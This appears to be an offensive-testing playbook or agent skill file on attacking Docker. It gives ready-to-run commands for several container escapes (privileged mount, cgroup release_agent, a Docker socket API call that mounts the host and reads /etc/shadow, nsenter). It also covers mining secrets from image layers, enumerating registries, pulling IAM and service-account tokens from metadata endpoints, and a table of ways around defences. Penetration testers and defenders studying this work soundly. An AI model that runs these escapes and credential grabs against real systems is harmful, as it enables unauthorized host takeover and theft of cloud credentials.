---
name: docker
description: Docker attack surface: container escape, socket exposure, image layer secrets, registry misconfiguration, sandbox escape, Dockerfile credential mining
depends_on: []
---

# Docker

Docker container security testing. Covers container escape vectors, Docker socket exposure, image layer secret extraction, registry misconfiguration, and Dockerfile/Compose credential mining. Corpus max $1.2M from archive extraction path traversal (Docker image format is a tar archive).

## Container Escape Vectors

### Privileged Container Escape

```bash
# Check if running in a container
cat /proc/1/cgroup 2>/dev/null | grep -q docker && echo "In Docker"
ls /.dockerenv 2>/dev/null && echo "In Docker"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i docker

# Check if privileged
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff = ALL capabilities = privileged container

# Privileged escape via host filesystem mount
fdisk -l 2>/dev/null  # find host disk
mount /dev/sda1 /mnt 2>/dev/null
chroot /mnt /bin/bash

# Privileged escape via cgroup notify_on_release
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'id > /output' >> /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

### Docker Socket Escape

If `/var/run/docker.sock` is mounted into the container:

```bash
# Check for Docker socket
ls -la /var/run/docker.sock 2>/dev/null

# Use Docker socket to create a privileged container with host mount
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'

# Or with docker CLI if available
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt
```

### Host PID Namespace Escape

```bash
# Check if host PID namespace is shared
ps aux | grep -c kubelet  # processes from host visible = hostPID
ls /proc/1/root/etc/shadow 2>/dev/null  # can we read host files via /proc?

# nsenter to host
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Capabilities-Based Escape

```bash
# Check granted capabilities
cat /proc/self/status | grep Cap
capsh --print 2>/dev/null

# CAP_SYS_ADMIN: mount cgroup for escape (see privileged escape above)
# CAP_DAC_OVERRIDE: read any file regardless of permissions
# CAP_NET_RAW: sniff network traffic, ARP spoofing
# CAP_SYS_PTRACE: attach to host processes if hostPID
```

## Image Layer Secret Extraction

Docker images are layered tarballs. Secrets added in one layer and "deleted" in a later layer still exist in the image history. $5K corpus pattern.

```bash
# Pull target's public Docker images
docker pull targetorg/app:latest

# Inspect image history for suspicious layers
docker history --no-trunc targetorg/app:latest

# Extract all layers and search for secrets
docker save targetorg/app:latest -o image.tar
mkdir layers && tar xf image.tar -C layers/

# Search every layer for credentials
find layers/ -name "layer.tar" -exec tar tf {} \; | grep -iE '\.env|secret|credential|password|key|token|config'
find layers/ -name "layer.tar" -exec sh -c 'tar xf {} -C /tmp/layer_extract 2>/dev/null; grep -rn "AKIA\|password\|secret\|api_key\|token" /tmp/layer_extract/ 2>/dev/null; rm -rf /tmp/layer_extract/*' \;

# Common secret patterns in image layers
grep -rn "AKIA[A-Z0-9]"          # AWS access keys
grep -rn "password\s*[:=]"        # Hardcoded passwords
grep -rn "BEGIN.*PRIVATE KEY"      # Private keys
grep -rn "ghp_\|gho_\|github_pat" # GitHub tokens
grep -rn "sk-[a-zA-Z0-9]"         # Stripe/OpenAI keys
```

## Dockerfile / Docker Compose Credential Mining

```bash
# Search public repos for Dockerfiles with secrets
grep -rn "ENV.*PASSWORD\|ENV.*SECRET\|ENV.*API_KEY\|ENV.*TOKEN" Dockerfile*
grep -rn "ARG.*PASSWORD\|ARG.*SECRET" Dockerfile*  # ARG values visible in image history

# Docker Compose secrets
grep -rn "password:\|secret:\|api_key:" docker-compose*.yml
grep -rn "\.env" docker-compose*.yml  # env_file references

# CI/CD Dockerfiles often contain real credentials
grep -rn "npm.*token\|pip.*index-url.*:.*@\|gem.*credentials" Dockerfile*
```

## Registry Misconfiguration

```bash
# Check for unauthenticated Docker registry access
curl -s https://registry.target.com/v2/_catalog
curl -s https://registry.target.com/v2/app/tags/list
curl -s https://registry.target.com/v2/app/manifests/latest

# Pull image manifest and inspect for secrets in env/labels
curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  https://registry.target.com/v2/app/manifests/latest | jq .

# Check for private images exposed via public registry
# Organizations often push internal images to Docker Hub without realizing they're public
docker search targetorg
```

## Cloud IDE / Shell Container Escape

When a target offers cloud shell, online IDE, or sandboxed code execution:

```bash
# Step 1: Detect containerization
cat /proc/1/cgroup | grep -E "docker|kubepods|containerd"
cat /proc/1/environ | tr '\0' '\n' | grep -i kube

# Step 2: Enumerate exposed host resources
ls -la /var/run/docker.sock     # Docker socket
ls -la /var/run/containerd/     # containerd socket
mount | grep -E "host|nfs"     # Host mounts
cat /proc/mounts | grep -v "overlay\|tmpfs\|proc\|sys"

# Step 3: Check for metadata service access
curl -s -m 2 http://169.254.169.254/latest/meta-data/  # AWS
curl -s -m 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/  # GCP
curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure

# Step 4: Check service account / IAM credentials
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
```

## Sandbox Profile Auditing

When auditing container sandbox profiles (seccomp, AppArmor, SELinux):

```bash
# Check seccomp mode
cat /proc/self/status | grep Seccomp
# Seccomp: 0 = disabled, 1 = strict, 2 = filter

# Check AppArmor profile
cat /proc/self/attr/current 2>/dev/null

# Enumerate allowed syscalls (if seccomp filter mode)
# Each allowed syscall that touches host resources is an escape candidate
# Focus on: mount, ptrace, unshare, clone, open_by_handle_at
```

## Free Compute Abuse

When a service offers untrusted code execution (CI runners, serverless builds, cloud notebooks, online IDEs):
1. First hypothesis: can you escape the sandbox?
2. Second hypothesis: can you access internal network/metadata from within the sandbox?
3. Third hypothesis: can you persist across sandbox teardown (write to shared volume, modify build cache)?

## Install Script Audit

Audit every Dockerfile, install script, and CI step for the fetch-execute pattern:

```bash
# Dangerous patterns in Dockerfiles
grep -n "curl.*|.*sh\|wget.*|.*sh\|curl.*|.*bash" Dockerfile*
grep -n "pip install.*--index-url\|npm install.*--registry" Dockerfile*
# Any "fetch over network -> execute as root" is a supply chain risk

# Check if fetched resources use HTTPS and verify checksums
grep -n "http://" Dockerfile*  # HTTP without TLS
grep -n "sha256\|checksum\|verify" Dockerfile*  # presence of verification
```

## Probe Targets

```bash
# Container detection (from inside)
cat /proc/1/cgroup 2>/dev/null | head -5
ls /.dockerenv 2>/dev/null
hostname  # random hex = likely container

# Capability check
cat /proc/self/status | grep -i cap
capsh --print 2>/dev/null

# Socket exposure
ls -la /var/run/docker.sock /var/run/containerd/containerd.sock 2>/dev/null

# Metadata service (from inside container)
curl -s -m 2 http://169.254.169.254/

# Registry enumeration (from outside)
curl -s https://registry.target.com/v2/_catalog 2>/dev/null
curl -s https://registry.target.com/v2/ 2>/dev/null

# Image layer inspection
docker pull targetorg/app:latest && docker history --no-trunc targetorg/app:latest

# Exposed infrastructure services
for port in 2375 2376 5000 5001; do
  curl -s -m 2 "http://target.com:$port/v2/_catalog" 2>/dev/null && echo "Port $port: Docker API/Registry"
done
```

## Defense-Bypass Pairs

| Defense | Bypass | Evidence |
|---------|--------|----------|
| Seccomp profile blocks `mount` | `open_by_handle_at` syscall to access host filesystem | Alternate syscall path |
| Docker socket not mounted | containerd socket or CRI socket at alternate path | Multiple runtime sockets |
| `--read-only` filesystem | `/tmp`, `/dev/shm`, `/proc` still writable | Tmpfs mounts bypass read-only root |
| Secrets removed in later Dockerfile layer | `docker save` + inspect all layers; "deleted" files persist | Layer history is append-only |
| Private registry requires auth | Public Docker Hub images from same org may be unprotected | Registry != Docker Hub |
| Non-root user in container | Capabilities still granted; kernel exploits don't need UID 0 | Capabilities > UID |
| IMDSv2 token-based metadata | Containers on same node may have different hop limits | Instance metadata hop misconfiguration |

## Cross-References

`container_escape`, `ssrf`, `information_disclosure`, `supply_chain`, `kubernetes_misconfiguration`, `cloud_security`

## Validation Requirements

- For container escape: demonstrate host-level access (read /etc/shadow, run host processes)
- For image layer secrets: show the extracted credential and confirm it is valid (or recently valid)
- For registry misconfig: demonstrate unauthorized image pull or catalog listing
- For Docker socket: demonstrate container creation with host mount
- Distinguish "running in Docker" from "escapable from Docker" -- most containers are not escapable
